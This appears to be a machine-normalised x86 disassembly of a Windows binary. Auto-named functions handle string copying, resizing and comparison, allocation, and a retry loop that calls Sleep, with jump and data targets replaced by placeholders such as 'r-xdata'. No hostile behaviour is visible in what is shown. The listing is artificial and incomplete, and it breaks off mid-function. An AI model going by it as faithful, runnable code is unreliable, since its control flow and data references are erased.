sub_401020
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
add [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_401070
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_424fc0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4010a0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_421ef0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401140
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_401170
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401120
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_4011d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_401200
push ebp
mov ebp esp
sub esp 0x8
push esi
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_4011b0
push eax
mov ecx [ ebp - 0x4 ]
call sub_4011b0
mov ecx eax
call sub_401140
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp - 0x4 ]
call sub_4011a0
mov esi eax
mov ecx [ ebp + 0x8 ]
call sub_4011a0
cmp esi eax
jne r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov al [ ebp - 0x8 ]
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_401260
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4011d0
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_401280
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
call eax
mov ecx eax
call sub_401200
mov esp ebp
pop ebp
retn 0x8
sub_4012b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_4011b0
push eax
mov ecx [ ebp - 0x8 ]
call sub_401140
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_4011a0
cmp eax [ ebp + 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_401330
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_4214b1
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov eax [ ebp - 0xc ]
or eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_401390
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4013c0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_401410
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401330
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_401470
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4014a0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_4014f0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_4214db
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov eax [ ebp - 0xc ]
or eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_401550
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_4214b1
add esp 0x4
test eax eax
je r-xdata
call sub_4015b0
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_4011d0
mov eax [ ebp + 0x8 ]
call sub_4015a0
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4011d0
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_4015c0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b039
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x50 ] 0x0
lea ecx [ ebp - 0x44 ]
call sub_419e50
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] 0x0
push r--data
mov ecx [ ebp - 0x48 ]
add ecx 0x4
call sub_401850
mov eax [ ebp - 0x48 ]
mov [ eax + 0x1c ] 0x0
mov ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push ecx
sub esp 0x18
mov ecx esp
mov [ ebp - 0x60 ] esp
mov edx [ ebp + 0xc ]
push edx
call sub_401790
mov [ ebp - 0x5c ] eax
lea ecx [ ebp - 0x44 ]
call sub_419fe0
mov [ ebp - 0x49 ] al
mov al [ ebp - 0x49 ]
mov [ ebp - 0x4b ] al
movzx ecx [ ebp - 0x4b ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_401790
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x2c ]
call sub_401890
add eax 0x1
push eax
lea ecx [ ebp - 0x2c ]
call sub_401870
push eax
lea ecx [ ebp - 0x44 ]
call sub_41a240
mov [ ebp - 0x54 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x4
push edx
mov ecx [ ebp + 0x8 ]
call sub_401790
mov eax [ ebp - 0x50 ]
or eax 0x1
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
call sub_40cb60
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x54 ] 0x64
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x4a ] 0x0
mov edx [ ebp - 0x48 ]
movzx eax [ edx + 0x1c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48 ]
movzx ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x58 ] 0x1
jmp r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_401850
lea ecx [ ebp - 0x2c ]
call sub_401890
add eax 0x1
push eax
lea ecx [ ebp - 0x2c ]
call sub_401870
push eax
lea ecx [ ebp - 0x44 ]
call sub_41a240
mov [ ebp - 0x4a ] al
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x58 ] 0x64
jg r-xdata
mov edx [ ebp - 0x54 ]
add edx 0x1
mov [ ebp - 0x54 ] edx
mov edx [ ebp - 0x48 ]
add edx 0x4
push edx
mov ecx [ ebp + 0x8 ]
call sub_401790
mov eax [ ebp - 0x50 ]
or eax 0x1
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x2c ]
call sub_401830
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
call sub_40cb60
mov eax [ ebp + 0x8 ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x58 ]
add ecx 0x1
mov [ ebp - 0x58 ] ecx
sub_401790
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x2 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401a60
mov ecx eax
call sub_401a80
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_401990
mov edx [ r--data ]
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_4018b0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_4017f0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_401990
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401960
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_4018b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_401890
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401b70
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_401ba0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401ab0
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
push eax
call sub_401070
add esp 0xc
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_401960
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_401020
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401af0
mov esp ebp
pop ebp
retn 0x4
sub_401990
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] ecx
movzx eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x14 ] 0xf
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401c30
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
push ecx
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_401d80
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_402180
add esp 0x4
push eax
mov edx [ ebp - 0x8 ]
push edx
call sub_401070
add esp 0xc
sub_401a80
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
call sub_401da0
add esp 0x8
push eax
mov ecx [ ebp + 0x8 ]
call sub_401d60
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_401ab0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_402180
add esp 0x4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_401af0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_402000
movzx ecx al
test ecx ecx
je r-xdata
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp + 0x8 ]
sub ecx eax
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_4018b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
push eax
call sub_401070
add esp 0xc
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c30
mov esp ebp
pop ebp
retn 0x8
sub_401b70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_401d20
sub_401ba0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_4010a0
add esp 0xc
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_401c30
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010d0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_401c70
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401df0
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401e30
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x10
jae r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_401c30
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
jae r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov al [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
push edx
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_401990
jmp r-xdata
sub_401d80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_402090
mov esp ebp
pop ebp
retn 0x8
sub_401df0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_401a60
mov ecx eax
call sub_4020d0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_401e30
push ebp
mov ebp esp
push 0xffffffff
push sub_43b060
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
or eax 0xf
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
call sub_401df0
cmp eax [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x1c ]
mov ecx [ edx + 0x14 ]
shr ecx 0x1
cmp ecx eax
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ edx + 0x14 ]
shr esi 0x1
mov ecx [ ebp - 0x1c ]
call sub_401df0
sub eax esi
mov ecx [ ebp - 0x1c ]
cmp [ ecx + 0x14 ] eax
ja r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x21 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
push eax
mov ecx [ ebp - 0x28 ]
call sub_4020b0
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
call sub_401df0
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x14 ]
shr eax 0x1
mov ecx [ ebp - 0x1c ]
add eax [ ecx + 0x14 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_401990
lea edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x23 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov ecx eax
call sub_402130
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x14 ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_401c30
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401ab0
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401070
add esp 0xc
sub_401f02
mov [ ebp - 0x10 ] esp
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x22 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
push ecx
mov ecx [ ebp - 0x2c ]
call sub_4020b0
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax r-xdata
retn
sub_402000
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401ab0
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x10 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov al 0x1
sub_402130
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_4021d0
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_402160
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4021f0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_402190
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4021d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_402210
pop ebp
retn
sub_402210
push ebp
mov ebp esp
push 0xffffffff
push sub_43aff1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x4
call sub_401000
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x10 ]
mov eax [ eax ]
mov [ edx ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_4022b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_42276a
add esp 0x4
xor eax eax
jmp r-xdata
pop ebp
retn
sub_402320
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
mov eax 0x1
jmp r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov eax 0x1
jmp r-xdata
pop ebp
retn
sub_402380
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
